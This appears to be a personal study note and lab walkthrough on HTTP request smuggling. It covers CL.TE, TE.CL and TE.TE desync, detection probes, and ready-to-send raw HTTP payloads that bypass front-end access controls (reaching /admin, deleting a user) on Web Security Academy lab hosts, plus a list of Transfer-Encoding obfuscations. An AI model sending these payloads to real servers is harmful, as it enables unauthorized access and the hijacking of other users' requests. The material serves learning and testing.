>[!abstract]+ **Scope**: Root cause of HTTP desynchronization vulnerabilities, how the attack works, vulnerability detection methodology, and exploitation examples.
## On HTTP and proxies

### HTTP/1.0

- Early **HTTP/1.0** (now deprecated) used **one TCP connection per each request-response pair**.
- The client opened a TCP connection, sent **one** HTTP request, the server returned **one** HTTP response, and the TCP connection was immediately torn down.

- A web page usually requires more than its main HTML document. Images, stylesheets, scripts, and other resources also need to be fetched. Under HTTP/1.0, all these resources were retrieved **sequentially, over separate TCP connections**. 

<img width="620" height="522" alt="hrs_1_http 0" src="https://github.com/user-attachments/assets/93a20a8d-95b2-472d-9c83-032f2a26232a" />

- Opening a new TCP connection for each resource introduces substantial latency, mainly due to handshake overhead. Page load time becomes extremely slow (for modern standards).
#### Unofficial keep-alive extensions

- To work around this, developers started introducing an unofficial **keep-alive mechanism** — an informal agreement between a client and server to maintain a persistent TCP connection across multiple request-response cycles.

- A client included the [`Connnection: keep-alive`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Connection) header in requests:

```http
Connection: Keep-Alive
```

- If supported, the server echoes the header in its response and keeps the TCP socket open for subsequent request-response exchanges.
- Either side could signal connection termination by sending the `Connection: close` header:

```http
Connection: close
```

<img width="620" height="523" alt="hrs_2_http 0" src="https://github.com/user-attachments/assets/1cf0d3de-d50f-4515-885f-584d1691a6f8" />


- This mechanism was never standardized in HTTP/1.0. Implementations varied wildly across vendors — different timeouts, maximum request counts per socket, inconsistent error handling, and other details. It worked, but unreliably.

### HTTP/1.1: persistence by default

- The HTTP/1.1 standard, [`RFC 7230`](https://datatracker.ietf.org/doc/html/rfc7230), made connection persistence the protocol default.
- After each response, the underlying TCP socket stays open unless either party sends `Connection: close` explicitly.

```http
Connection: close
```

>[!important] HTTP/1.1 doesn't require a `Connection: keep-alive` header to maintain persistent connections; persistence is the protocol default. Only the `Connection: close` header is required to signal connection termination.

<img width="620" height="522" alt="hrs_3" src="https://github.com/user-attachments/assets/c8941279-29c6-4aee-b5f3-7e8a810b3cf0" />

### HTTP pipelining and HOL

- HTTP/1.1 also defined **HTTP pipelining**. This mechanism allows a client to send **multiple HTTP requests back-to-back** over one persistent connection **without waiting each preceding response**.
- So, a client can requests multiple resources nearly at the same time and then wait for the responses instead of waiting for the previous response to arrive to send the next request.
- The server must return the corresponding responses **in the exact same order** as the requests were received (FIFO, First-In, First-Out). 

<img width="620" height="573" alt="hrs_4" src="https://github.com/user-attachments/assets/b8494208-dcff-4e9c-a998-477d04e6c5b9" />

- This also means that one slow request/response (e.g., executing a slow database query or sending a large file) **delays all subsequent queued responses**. This condition is known as **head-of-line (HOL) blocking**
- This is the reason why developers mostly disable HTTP/1.1 pipelining by default.

>[!note] Head-of-line blocking in HTTP/1 pipelining is still a current problem (solved only in HTTP/2). So, usually, when using HTTP/1.1 you would wait for one resource to load before requesting another. 
 
 >[!note] HTTP/2 eliminates HOL blocking through **binary stream multiplexing**: frames from different streams are interleaved concurrently on a single connection without ordering constraints. This is one of the primary motivations behind the HTTP/2 design.

### Message boundaries

- TCP is a byte-stream protocol. It has no internal awareness of application-layer message boundaries. It simply transfers raw byte streams across network interfaces. At the same time, HTTP/1.1 is a text-based protocol 
- In a persistent connection — where multiple requests flow over a single socket one after another —  parsers still need a reliable mechanism to identify where one request ends and the next one begins. 

- HTTP/1.1 defines two distinct mechanisms for specifying message boundaries:
	- **`Content-Length`**
	- **`Transfer-Encoding: chunked`**

>[!bug] Discrepancies in implementation of these two mechanisms — `Content-Length` and `Transfer-Encoding: chunked` — which one takes priority when both are present — is the root cause of **HTTP request smuggling vulnerabilities**.
#### `Content-Length`

- The [`Content-Length`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Length) HTTP header  specifies the exact size of the message body in **decimal octets (bytes written as a decimal number)**:

```http
Content-Length: <length>
```

- The declared integer counts only bytes in the body; it excludes HTTP header fields and the blank line ([CRLF](https://developer.mozilla.org/en-US/docs/Glossary/CRLF), `\r\n`) that separates headers from the message body:

```http
POST /path/query HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
␍␊                  ← doesn't count
q=anything          ← counts
```

>[!note] Here, ␍␊  denotes a CRLF sequence (Carriage Return `\r`, Line Feed `\n`; hex `0D 0A`).

- When content transformations are applied (such as `gzip`), `Content-Length` reflects the size **after encoding** (e.g., compressed size), not the original.

>[!note] See [`Content-Length header — MDN Web Docs`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Length).

### `Transfer-Encoding: chunked`

- The [`Transfer-Encoding`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Transfer-Encoding) header specifies the encoding transformations applied to a message body for network transit.

>[!interesting]- Common `Transfer-Encoding` values
> - `chunked` — The message body is delivered in a sequence of self-framing chunks. When active, `Content-Length` must be ignored.
> - `deflate` — The payload body is compressed using the Deflate algorithm.
> - `gzip` — The payload body is compressed using the LZ77 algorithm with a 32-bit CRC.
> - `compress` — The payload body is compressed using the LZW algorithm.

>[!note] See [`Transfer-Encoding — MDN Web Docs`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Transfer-Encoding).

- `Transfer-Encoding: chunked` splits the message body into discrete chunks. Each chunk is explicitly prefixed by its size expressed in **hexadecimal octets (bytes written as a hexadecimal number)**:

```http
Transfer-Encoding: chunked
```

>[!note] `chunked` encoding is used when the total payload length is unknown at the start of transmission, such as for content streaming.


```http
POST / HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
␍␊         ← not a part of the message body

B␍␊
first chunk␍␊
␍␊
C␍␊
second chunk␍␊
␍␊
0␍␊
␍␊
```

- Each chunk structure:
	- **Chunk size + `\r\n`** — Chunk size in **hexadecimal octets** + CRLF.
	- **Chunk data** — The raw byte payload of the specified length.
	- **`\r\n`** — A trailing `\r\n` sequence (not counted in the chunk size).

```http
B␍␊         ← chunk size: eleven bytes
first chunk␍␊
␍␊
```

- Last chunk that marks the end of the sequence:
	- **Chunk size `0` + `\r\n`** — Zero-size chunk, signifies there are no more octets in the sequence. 
	- **(Optional) trailer headers** — [HTTP trailer headers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Trailer), may be empty.
	- **`\r\n`** — End of chunk with zero data octets.
	
```http
0␍␊
␍␊
```

>[!important] `RFC 7230` specifies that if `Transfer-Encoding` is present and specifies `chunked`, the receiver **must** ignore any `Content-Length` header in the same message. The specification is unambiguous. The problem is, real-world implementations often deviate from it.

### Intermediaries and connection coalescing

- Production deployments rarely route client HTTP traffic directly to the backend.
- Inbound requests traverse intermediary nodes: reverse proxies, load balancers, CDN edge servers, and WAFs (Web Application Firewalls).

<img width="502" height="97" alt="hrs_5" src="https://github.com/user-attachments/assets/5b1879aa-2b19-4325-924e-36054b87920f" />

### Connection coalescing

- For a reverse proxy, establishing a fresh TCP connection to backend nodes for every forwarded request **negates** the performance benefits of persistent connections maintained with clients
- Instead, intermediaries maintain a pool of persistent TCP connections to backend servers; these are kept open so that requests from multiple distinct clients can be multiplexed over them. This is called **connection coalescing**.


>**Connection coalescing** is the practice of routing multiple incoming client requests through a single maintained TCP connection to an upstream server. This eliminates per-request TCP handshake overhead between the proxy and the backend.

<img width="460" height="592" alt="hrs_6_coalescing" src="https://github.com/user-attachments/assets/7ec1d754-9a10-4565-a02a-59d6ad6643c8" />

- From the perspective of the backend server, any single TCP socket carries a stream of bytes (HTTP requests) originating from many distinct sessions.
- To attribute individual to respective requests, the backend relies on HTTP message boundaries **inferred from (user-controlled) HTTP headers** (`Content-Length` and `Transfer-Encoding`).

>[!important] The backend generally does **not** know which frontend TCP connection or end user a request originally came from just because the proxy is coalescing connections.

>[!bug] Connection coalescing is what makes HTTP request smuggling be able to affect other users.

>[!note]+ What proxies do to request
> - Beyond simply forwarding bytes, intermediary servers can meaningfully transform requests before passing them upstream. Common transformations include:
> 
> 	- **Header injection**
> 		- Adding `X-Forwarded-For`, `X-Real-IP`, `X-Forwarded-Proto`, and similar headers.
> 	- **Header normalization**
> 		- Some proxies enforce a canonical header format, such as by lowercasing header names, collapsing duplicate whitespace, or stripping unknown or non-standard headers. 
> 		- Obfuscation-based TE.TE attacks often fail against proxies that normalize aggressively — the malformed `Transfer-Encoding` variant gets cleaned before it reaches the back-end.
> 	- **Chunked decoding and re-encoding**
> 		- Certain proxies decode a chunked request body, buffer the decoded content, and re-send it to the back-end as a non-chunked request with a fresh `Content-Length`. 
> 		- If this occurs, TE.CL and CL.TE attacks are typically neutralized at that hop.
> 	- **Security filtering**
> 		- WAFs positioned as front-end proxies may strip, reject, or modify requests containing suspicious payloads — including requests with both `Content-Length` and `Transfer-Encoding`. 
> 		- This is partly why TE.TE obfuscation exists: to get a mutated header past a filtering layer that would otherwise block the dual-header pattern.

## Parser disagreement and HTTP request smuggling

- [`RFC 7230`](https://datatracker.ietf.org/doc/html/rfc7230) dictates that `Transfer-Encoding: chunked` overrides `Content-Length`.
- However, how parsers process requests where both headers are present still differs across implementations.

>**HTTP Request Smuggling (HRS)**, also known as **HTTP desync attack**, is an attack that exploits **inconsistencies in how front-end (e.g., load balancers, reverse proxies) and backend servers interpret HTTP request boundaries**.

- Typically, HRS attacks manipulate the way the front-end and back-end servers interpret requests with both `Content-Length` and `Transfer-Encoding` headers present.

>[!important] As long as every component in the request path makes the same decision, the connection remains synchronized. Request smuggling becomes possible when two components **disagree**.

>[!important] The attack doesn't require either server to be "wrong" in isolation. It only requires them to disagree. A standards-compliant front-end paired with a non-compliant backend, or vice versa, is sufficient.

### RFC ambiguities that enable desync

- Common causes of desynchronization:
	- Some front-end servers **do not support `Transfer-Encoding`** in requests and silently fall back to `Content-Length`.
	- Some servers **apply their own priority ordering** regardless of the RFC.
	- **Whitespaces** around header names and values may be handled differently.
	- **Non-ASCII** bytes in header values, such as null bytes and tab characters, may be parsed differently.
	- **Header folding** (multi-line header values) is formally deprecated in `RFC 7230 `but still accepted by some parsers.

## Classic HTTP/1.1 desync taxonomy

- HRS variants are named using `X.Y` notation, where `X` represents the message boundary mechanism used by the **front-end proxy**, and `Y` represents the mechanism used by the **backend server**:
	- **CL.TE (`Content-Length.Transfer-Encoding`)**
	- **TE.CL (`Transfer-Encoding.Content-Length`)**
	- **TE.TE (`Transfer-Encoding.Transfer-Encoding`)**

>[!note] As an attacker, your goal is to make the front-end interpret your request as one, and the backend — as two.

| Vector | Front-End Parsing | backend Parsing | Smuggled Data Location |
| :--- | :--- | :--- | :--- |
| `CL.TE` | `Content-Length` | `Transfer-Encoding` | Bytes following the zero chunk (`0\r\n\r\n`) up to the `Content-Length` boundary. |
| `TE.CL` | `Transfer-Encoding` | `Content-Length` | Bytes contained within the chunk payload beyond the declared `Content-Length` boundary. |
| `TE.TE` | `Transfer-Encoding` (or fallback) | Fallback (or `Transfer-Encoding`) | Header obfuscation induces one node to ignore `Transfer-Encoding` and revert to `Content-Length`, resolving to `CL.TE` or `TE.CL`. |

## CL.TE desync

- In a **CL.TE** vulnerability:
	- The **front-end** server does not support or silently ignores the `Transfers-Encoding: chunked` header. It relies entirely on the `Content-Length` header to determine where the request body ends.
	- The **backend** server correctly implements chunked encoding. It prioritizes `Transfer-Encoding` when both headers are present.
### CL.TE requests

- You craft a single request containing both `Content-Length` and `Transfer-Encoding: chunked` headers:

```http
POST / HTTP/1.1
Host: example.com
Content-Length: 13
Transfer-Encoding: chunked

0␍␊
␍␊
SMUGGLED
```

- The **front-end** (`CL`) measures the body using `Content-Length` and forwards all declared bytes to the back-end (everything including `SMUGGLED`).

- The **back-end** (`TE`) favors `Transfer-Encoded: chunked` and processes the body as a series of chunks. It sees a `0␍␊` chunk (which signals the end of the request) and considers the current request complete.

- The remaining bytes after the zero chunk — bytes that the front-end included because they fall within the `Content-Length` boundary (`SMUGGLED`) — remain in the connection buffer. These bytes are interpreted as a the **prefix of the next request** arriving on the same connection.

<img width="696" height="972" alt="hrs_8_CL TE_SMUGGLED" src="https://github.com/user-attachments/assets/418f42d4-d065-4f74-946b-1eeda99a7af4" />

- The front-end reads exactly the number of bytes specified by `Content-Length` and forwards them.
- The back-end sees the `0` chunk, ends the current request, and treats everything after it as the beginning of the next request.

>[!tip] How to calculate `Content-Length`?
> 
> - Your zero-length chunk and everything you smuggle after it (what will remain in the connection buffer) should be included in `Content-Length`. 
> - `0␍␊␍␊` (`5` bytes) + `SMUGGLED` (`8` bytes) = `13` bytes.
> - You can leave the task to calculate the length to Burp Repeater, as it should include everything you send. The main objective is to prepend your smuggled data with a zero-length chunk that, if interpreted using `Transfer-Encoding: chunked`, ends the chunked stream.

>[!important] The CRLF `␍␊` that separates HTTP headers and the body is **not** counted by the `Content-Length` header.

>[!tip]+ Automated Content-Length calculation
> You can verify payload lengths using Burp Inspector's Hex tab, or compute ascii byte lengths in Python:
> 
> ```python
> body = """0
> 
> GET /admin HTTP/1.1
> Host: example.com
> Foo: x
> """
> print(len(body.encode('ascii')))
> ```

>[!note] See [[🛠️ HTTP request smuggling labs#13. HTTP request smuggling, basic CL.TE vulnerability]]

### Exploiting CL.TE to bypass access controls

- To bypass front-end access controls using CL.TE, send the following payload twice over Repeater:

```http
POST / HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Foo: x
```

<img width="699" height="1102" alt="hrs_9_CL TE" src="https://github.com/user-attachments/assets/81d0230d-921d-4562-8dab-a8e4a58ab82b" />

>[!interesting]+ How this works
>
> - The body the front-end sees (governed by `Content-Length: 49`) starts right after the headers’ blank line:
> 
> ```http
> 0␍␊
> ␍␊
> GET /admin HTTP/1.1␍␊
> Host: localhost␍␊
> Foo: x
> ```
> 
> - The total `Content-Length` is `49`:
> 	- `0␍␊` -> `3` bytes.
> 	- `␍␊` (the empty line after the `0` chunk) -> `2` bytes.
> 	- `GET /admin HTTP/1.1␍␊` -> `21` bytes (`19` printable characters + `2` CRLF bytes).
> 	- `Host: localhost␍␊` -> `17` bytes (`15` characters + `2` CRLF bytes).
> 	- `Foo: x` (no CRLF) -> `6` bytes.
> 	- Total: `3 + 2 + 21 + 17 + 6 = 49` bytes.
> 
> >[!important] The final header line (`Foo: x`) intentionally lacks a trailing CRLF.
> 
> - Why sent twice?
> - **First send**: The smuggled request is left in the back-end’s connection buffer, poisoning the stream.
> - **Second request** (usually a normal `GET /` or `POST /`): The back-end processes the leftover bytes from the first request as the current request.

- Notice that in the above request, the `Host` header appears **two times**. If the application validates this, you will get an error (e.g., `Duplicate header names are not allowed`). 
- To deal with that, you can **make the headers of the next request, including `Host`, to be treated as part of the request body**:

```http
POST / HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```

>[!note]+ How this works
> - The smuggled request’s own Content-Length: 10 is deliberately larger than the actual body (`x=`). This makes the smuggled request consume part of the _following_ legitimate request and stabilize the exploit.

## TE.CL desync

- In a **TE.CL** vulnerability:
	- The **front-end proxy** uses `Transfer-Encoding: chunked` to delimit request boundaries.
	- The **backend application server** uses `Content-Length` to delimit request boundaries, ignoring `Transfer-Encoding`.

### TE.CL requests

- You craft a single request containing **both** `Content-Length` and `Transfer-Encoding: chunked` headers.

```http
POST / HTTP/1.1
Host: example.com
Content-Length: 3
Transfer-Encoding: chunked

8␍␊
SMUGGLED␍␊
0␍␊
␍␊
```

- The **front-end** (`TE`) fully parses the chunked body (including all chunk data and the terminating `0` chunk) and forwards the entire raw byte sequence to the back-end.
- The **back-end** (`CL`) reads only the small number of bytes specified by `Content-Length`, then considers the request complete. 
- Everything after the `Content-Length` boundary remains in the connection buffer. These bytes are interpreted as the **prefix of the next request**.


![[TE.CL.svg]]


- The front-end (`TE`) processes body as **chunks**.
	- The first chunk: `8` (hex) = `8` decimal bytes of data: `SMUGGLED␍␊`.
	- Then terminating chunk `0␍␊`.
	- The front-end forwards this entire request as chunked to the backend. 
- The back-end (`CL`) uses `Content-Length`
	- It only reads the first `3` bytes of the body (`8␍␊`).
	- Stops there. The rest of the body (`SMUGGLED...`) is left on the socket. 
	- When the nest real request arrives on the same connection, the back-end treats those leftover bytes as the **beginning** of that next request.
- `Content-Length: 3` is the byte length of `8␍␊` (the chunk-size line is one ASCII digit + CRLF). The back-end reads 3 bytes and considers the body done.
- `SMUGGLED␍␊0␍␊␍␊` remains in the buffer as the next request's prefix. 


>[!note] In TE.CL HRS, you need to include the trailing sequence `␍␊` following the final `0`.

| Segment | Bytes |
| :--- | :--- |
| `8␍␊` | `3` |
| `␍␊` | `2` |
| `SMUGGLED` | `8` |
| Total | `13` |

>[!example]+
>The following request exploits TL.CE HRS to bypass front-end security controls and access admin panel:
> ```HTTP
> POST / HTTP/1.1
> Host: example.com
> Content-Length: 3
> Transfer-Encoding: chunked
> 
> 25
> GET /admin HTTP/1.1
> Host: example.com
> 0
> 
> ```

>[!important] When calculating the size of a chunk in `Transfer-Encoding: chunked`, **the CRLF bytes surrounding the chunk data are NOT included** in the chunk size value itself.

### Exploiting `TE.CL` to bypass access controls

- To exploit TE.CL for privilege escalation or access control bypass, send the following payload twice:

```http
POST / HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

71
POST /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```

- **Outer `Content-Length: 4`** 
	- This is the value the back-end uses. It tells the back-end to only read the first 4 bytes of the body. 
	- Commonly set to `3`, `4`, or `5` — you want it to consume just the start of the first chunk line (e.g., `60␍␊` or `87␍␊`).
- **The big chunk size** (in hex)
	1. Write the **full smuggled request** you want the back-end to process (including all its headers and the blank line).
	2. Count the **exact byte length** of everything from the start of that smuggled request **up to and including** the last byte before the final `0`.
	3. Convert that decimal number to **hexadecimal** → that becomes your chunk size.
	```http
	POST /admin HTTP/1.1␍␊
	Host: localhost␍␊
	Content-Type: application/x-www-form-urlencoded␍␊
	Content-Length: 15␍␊
	␍␊
	x=1
	```
	
	- The full size of the smuggled request is `113` in decimal:
		- `POST /admin HTTP/1.1␍␊` -> `22` bytes. 
		- `Host: localhost␍␊` -> `17` bytes.
		- `Content-Type: application/x-www-form-urlencoded␍␊` -> `49` bytes.
		- `Content-Length: 15␍␊` -> `20` bytes.
		- `␍␊` -> `2` bytes.
		- `x=1` -> `3` bytes.
	- Convert to hex: `113` -> `71`.
- **`Content-Length: 15 + x=1` in the smuggled request**
	- Setting a slightly larger `Content-Length` than the actual body (`x=1` is `3` bytes) helps 'eat' part of the next real request, stabilizing the attack and preventing the connection from breaking immediately.

```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-length: 4
Transfer-Encoding: chunked

87
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```

## TE.TE desync 

- Both front-end and back-end servers *nominally* prefer `Transfer-Encoding: chunked` to parse request bodies. Neither should use `Content-Length`.
- However, if you submit a malformed or duplicated `Transfer-Encoding` header that one server accepts and the other rejects, the accepting header would use `Transfer-Encoding` header and the rejecting would fall back to `Content-Length`.
- Recreating either a CL.TE or TE.CL condition depending on which server was confused.

>[!quote] There are potentially endless ways to obfuscate the `Transfer-Encoding` header.

- Common `Transfer-Encoding` obfuscation patterns include:

- Prefixing the header value:

```http
Transfer-Encoding: xchunked
```

- Injecting spaces or tabs around header colons:

```http
Transfer-Encoding : chunked
```

```http
Transfer-Encoding:	chunked
```

- Injecting leading whitespace before the header key:

```http
	Transfer-Encoding: chunked
```

>[!note] HTTP/1.1 header folding (splitting a header value across multiple lines using leading spaces/tabs) is specified in [`RFC 2616`](https://datatracker.ietf.org/doc/html/rfc2616) but **deprecated** in [`RFC 7230`](https://datatracker.ietf.org/doc/html/rfc7230)(current standard). Some legacy implementations, however, may still interpret the leading whitespace as a folded continuation of the previous header, misreading the line (parsers should normally reject those).

- Injecting non-ASCII or null bytes into header values:

```http
Transfer-Encoding: chùnked
```

```http
Transfer-Encoding: \x00chunked
```

- Supplying duplicate `Transfer-Encoding` headers with valid and invalid values:

```http
Transfer-Encoding: chunked
Transfer-Encoding: x
```

>[!note] Parsers taking the first occurrence read `chunked`; parsers taking the final occurrence read `x` (invalid, reverting to `Content-Length`). The disagreement creates a split.

- Injecting newline characters between the key and colon:

```http
Transfer-Encoding
: chunked
```

- Summary matrix of header obfuscation variations:

```http
Transfer-Encoding: xchunked     # arbitrary symbols before the value

Transfer-Encoding : chunked     # space before the colon

Transfer-Encoding:   chunked    # tab before the value

Transfer-Encoding    : chunked

Transfer-Encoding:xchunked      # invalid value prefix

Transfer-Encoding: chunked      # Transfer-Encoding is duplicated 
Transfer-Encoding: x            # one value is valid, the other isn't

 Transfer-Encoding: chunked     # space injection before the header

	Transfer-Encoding: chunked  # tab before the header

X: X                            # arbitrary invalid header followed by
Transfer-Encoding: chunked      # a valid Transfer-Encoding

Transfer-Encoding               # new line injeciton
: chunked

Transfer-Encoding:              # new line + tab injeciton
	chunked

Transfer-Encoding: chùnked      # replacing characters

Transfer-Encoding: \x00chunked  # NULL byte injection
```

- Payload instance targeting a TE.TE vulnerability that degrades to TE.CL:

```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked
Transfer-encoding: x

5c␍␊
GPOST / HTTP/1.1␍␊
Content-Type: application/x-www-form-urlencoded␍␊
Content-Length: 15␍␊
␍␊
x=1␍␊
0␍␊
␍␊
```

>[!note] In TE.CL HRS, you need to include the trailing sequence `␍␊` following the final `0`.

>[!example]
> ```HTTP
> POST / HTTP/1.1
> Host: example.com
> Content-Length: 4
> Transfer-Encoding: chunked
> Transfer-Encoding: cat
> 
> 5c
> GPOST / HTTP/1.1
> Content-Type: application/x-www-form-urlencoded
> Content-Length: 15
> 
> x=1
> 0
> 
> 
> ```
> 
> - The front-end server receives the request and processes the first `Transfer-Encoding: chunked` header, parsing the message body as chunked data. It forwards what it believes is a complete request.
> - The back-end server, depending on how it handles multiple or malformed `Transfer-Encoding` headers, may ignore the chunked encoding due to the conflicting or malformed header, and instead rely on `Content-Length`. It then may interpret the remaining bytes as a separate HTTP request (starting with `GPOST ...`).

>[!tip] Even minor differences in the implementation or header processing order can trigger the vulnerability.

>[!tip]- How to construct a TE.TE payload
> 1. Select the target request to smuggle:
> 
> ```HTTP
> GET /admin HTTP/1.1
> Host: example.com
> ```
> 
> 2. Define primary POST request template:
> 
> ```HTTP
> POST / HTTP/1.1
> Host: example.com
> Content-Length: 3
> Transfer-Encoding: chunked
> 
> BODY
> 
> ```
> 
> 3. Insert target request inside chunk body:
> 
> ```HTTP
> POST / HTTP/1.1
> Host: example.com
> Content-Length: 3
> Transfer-Encoding: chunked
> 
> XX
> GET /admin HTTP/1.1
> Host: example.com
> 0
> ```
> 
> 4. Calculate chunk length in hex and insert prefix:
> 
> ```HTTP
> POST / HTTP/1.1
> Host: example.com
> Content-Length: 3
> Transfer-Encoding: chunked
> 
> 25
> GET /admin HTTP/1.1
> Host: example.com
> 0
> ```
> 
> 5. Append obfuscated `Transfer-Encoding` header:
> 
> ```HTTP
> POST / HTTP/1.1
> Host: example.com
> Content-Length: 3
> Transfer-Encoding: chunked
> Transfer-Encoding: cat
> 
> 25
> GET /admin HTTP/1.1
> Host: example.com
> 0
> ```
> 
> 6. Verify CRLF (`\r\n`) line terminations:
> 
> ```HTTP
> POST / HTTP/1.1\r\n
> Host: example.com\r\n
> Content-Length: 3\r\n
> Transfer-Encoding: chunked\r\n
> Transfer-Encoding: cat\r\n
> \r\n
> 25\r\n
> GET /admin HTTP/1.1\r\n
> Host: example.com\r\n
> 0\r\n
> \r\n
> ```

## Burp Repeater environment configuration

1. **Downgrade HTTP/2 to HTTP/1.1**
	- Open `Repeater`, navigate to `Inspector` -> `Request attributes` -> `Protocol`, and select `HTTP/1.1`.

![[http1.1_downgrade.png]]

2. **Change request method to `POST`**
	- Right-click inside the request editor and select `Change request method`.

![[change_request_method.png]]

3. **Disable automatic `Content-Length` updates**
	- Open Repeater settings menu and uncheck `Update Content-Length`.

![[disable_length_update.png]]

4. **Show non-printable characters**
	- Toggle the `\n` character visibility icon in the top right of the request panel.

![[show_non-printable_characters.png]]

>[!tip] Remove non-essential headers from probe requests to simplify byte counting and payload debugging.

- Issue the modified baseline request to verify that the target application processes standard HTTP requests normally before injecting desync payloads.

## Vulnerability detection and confirmation

// create diagrams like in the playlist to explain how detection works

### Detecting request smuggling using timing probes

- Issue the initial CL.TE timing probe:

```http
POST / HTTP/1.1
Host: example.com
Content-Length: 6
Transfer-Encoding: chunked

3␍␊
ABC␍␊
X␍␊
```

>[!interesting]+ Analyzing results
> - **Immediate response from backend (`CL.CL`):** The application relies on `Content-Length` at both tiers or ignores chunked encoding consistently.
> - **Immediate rejection by front-end (`TE.CL` / `TE.TE`):** The front-end parses `Transfer-Encoding: chunked`. It processes chunk `3` (`ABC`), encounters non-hex character `X` on line 3, rejects the request, and drops it before reaching the backend. Proceed to probe 2.
> - **Socket timeout at backend (`CL.TE`):** The front-end uses `Content-Length: 6`, forwarding 6 bytes (`3\r\nABC`). The backend uses `Transfer-Encoding: chunked`, reads chunk `3` (`ABC`), and pauses waiting for the next chunk header until socket timeout occurs.
> 
> ![[probe_1_CL.TE_timeout.png]]

- Issue the secondary TE.CL timing probe:

```http
POST / HTTP/1.1
Host: example.com
Transfer-Encoding: chunked
Content-Length: 6

0␍␊
␍␊
X
```

>[!interesting]+ Analyzing results

![[detecting_HRS.svg]]

- If probe 1 was rejected by the front-end and probe 2 returned an immediate response, test for `TE.TE` by appending an obfuscated `Transfer-Encoding` header to probe 2:

```http
POST / HTTP/1.1
Host: 0acf0019030da4d2804cb23a00f500f6.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked
Transfer-Encoding: x

0␍␊
␍␊
X
```

- Immediate rejection by front-end confirms `TE.TE` degrading to `TE.CL`. Socket timeout confirms `TE.TE` degrading to `CL.TE`.

### Confirming vulnerabilities using differential responses

- To confirm a **CL.TE** vulnerability, transmit the following request twice sequentially:

```http
POST / HTTP/1.1
Host: example.com
Content-Length: 6
Transfer-Encoding: chunked

0␍␊
␍␊
X
```

>[!note] Alternatively, issue the attack request immediately prior to a standard request over a shared connection pool. Ensure both requests target identical paths to route over the same backend TCP socket.

>[!interesting]- Analyzing results
> If vulnerable to CL.TE:
> - Front-end reads `Content-Length: 6` and forwards 6 bytes (`0\r\n\r\nX`), dropping the trailing `X` from the current message frame boundary.
> - Backend reads `0\r\n\r\n` (chunked terminator) and completes request 1.
> - The character `X` remains in the backend socket buffer. When request 2 (`POST / HTTP/1.1`) arrives, the backend reads `XPOST / HTTP/1.1`, returning an HTTP `400 Bad Request` or `"Unrecognized method XPOST"` response.
> 
> ![[confirming_CL.TE.png]]

- To confirm a **TE.CL** vulnerability, transmit the following request twice sequentially:

```http
POST / HTTP/1.1
Host: example.com
Content-Length: 3
Transfer-Encoding: chunked

1␍␊
X␍␊
0␍␊
␍␊
```

![[confirming_HRS.svg]]

## Exploitation methodologies

### Modifying secondary HTTP requests

#### CL.TE 404 injection

- Smuggle a request path that triggers a `404 Not Found` response on the subsequent request:

1. Attack request:

```http
POST / HTTP/1.1
Host: 0a9100ac045190a48181d4360070009f.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Transfer-Encoding: chunked

0␍␊
␍␊
GET /404 HTTP/1.1␍␊
X-Ignore: X
```

>[!note]+ Calculating request size
> `Content-Length` in the `POST` request must cover the body from the initial `0` to the trailing `X`, inclusive of all internal CRLF line endings.
> 
> ![[images/walkthrough/PortSwigger/HRS/lab1/2.png]]

2. Normal request:

```http
GET / HTTP/1.1
Host: 0a9100ac045190a48181d4360070009f.web-security-academy.net
```

>[!bug]+ Labs
> - [[🛠️ HTTP request smuggling labs#1. HTTP request smuggling, confirming a CL.TE vulnerability via differential responses]].

#### TE.CL 404 injection

- Smuggle a 404 request under TE.CL:

1. Attack request:

```http
POST / HTTP/1.1
Host: 0aaa0071035c2af08088853c005c00f4.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

9d␍␊
GET /404 HTTP/1.1␍␊
Host: 0aaa0071035c2af08088853c005c00f4.web-security-academy.net␍␊
Content-Type: application/x-www-form-urlencoded
Content-Length: 99
␍␊
X=␍␊
0␍␊
␍␊
```

>[!note]+ Calculating request size
> - Outer `Content-Length` is set to the byte size of the initial chunk size hex digits + CRLF (`4` bytes).
> - Chunk length `9d` (hexadecimal = 157 bytes decimal) covers everything from `GET /404` down to `X=`.
> 
> ![[images/walkthrough/PortSwigger/HRS/lab2/5.png]]
> 
> - Smuggled `Content-Length: 99` causes the backend to consume 99 bytes of the subsequent request into parameter `X=`.

2. Normal request:

```http
GET / HTTP/1.1
Host: 0aaa0071035c2af08088853c005c00f4.web-security-academy.net
```

### Bypassing front-end access controls

#### CL.TE access control bypass

```http
POST / HTTP/1.1
Host: 0a54003104792bf6804e7cb2001400c3.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 117
Transfer-Encoding: chunked

0␍␊
␍␊
GET /admin HTTP/1.1␍␊
Host: localhost␍␊
Content-Type: application/x-www-form-urlencoded␍␊
Content-Length: 100␍␊
␍␊
x=
```

>[!bug]+ Labs
